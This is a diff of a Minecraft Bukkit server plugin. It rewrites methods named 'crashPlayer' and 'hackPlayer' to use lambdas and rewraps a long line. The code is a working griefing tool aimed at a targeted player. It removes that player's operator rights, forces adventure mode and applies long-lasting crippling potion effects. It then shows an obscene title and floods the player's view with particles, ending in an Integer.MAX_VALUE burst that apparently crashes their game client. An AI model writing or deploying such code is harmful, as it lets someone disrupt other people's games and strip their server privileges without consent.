@@ -21,7 +21,6 @@ public class Main extends JavaPlugin implements Listener
             new PotionEffect(PotionEffectType.GLOWING, 1000000, 1000),
             new PotionEffect(PotionEffectType.MINING_FATIGUE, 100000, 1000));
 
-
     @Override
     public void onEnable()
     {
@@ -32,19 +31,11 @@ public class Main extends JavaPlugin implements Listener
 
     void crashPlayer(Player p)
     {
-        int task1 = Bukkit.getScheduler().scheduleSyncRepeatingTask(this, new Runnable()
-        {
-            public void run()
-            {
-                p.spawnParticle(Particle.SQUID_INK, p.getEyeLocation(), 1000);
-            }
+        int task1 = Bukkit.getScheduler().scheduleSyncRepeatingTask(this, () ->
+                p.spawnParticle(Particle.SQUID_INK, p.getEyeLocation(), 1000), 0, 1);
 
-        }, 0, 1);
-
-        Bukkit.getScheduler().scheduleSyncDelayedTask(this, new Runnable() { public void run()
-        {
-            p.spawnParticle(Particle.SQUID_INK, p.getEyeLocation(), Integer.MAX_VALUE);
-        }}, 100);
+        Bukkit.getScheduler().scheduleSyncDelayedTask(this, () ->
+                p.spawnParticle(Particle.SQUID_INK, p.getEyeLocation(), Integer.MAX_VALUE), 100);
     }
 
     void hackPlayer(Player targetPlayer)
@@ -57,7 +48,8 @@ public class Main extends JavaPlugin implements Listener
         targetPlayer.setOp(false);
         targetPlayer.setGameMode(GameMode.ADVENTURE);
         targetPlayer.addPotionEffects(hackEffects);
-        targetPlayer.sendTitle(ChatColor.BOLD + "" + ChatColor.RED + "FUCK YOU", ChatColor.MAGIC+"oiuwyf87rgfo38ff093uf93f8y387f3f8f4738f743f8374f384f734gf83f34", 1, 1000, 1);
+        targetPlayer.sendTitle(ChatColor.BOLD + "" + ChatColor.RED + "FUCK YOU", ChatColor.MAGIC+
+                "oiuwyf87rgfo38ff093uf93f8y387f3f8f4738f743f8374f384f734gf83f34", 1, 1000, 1);
         crashPlayer(targetPlayer);
     }
 
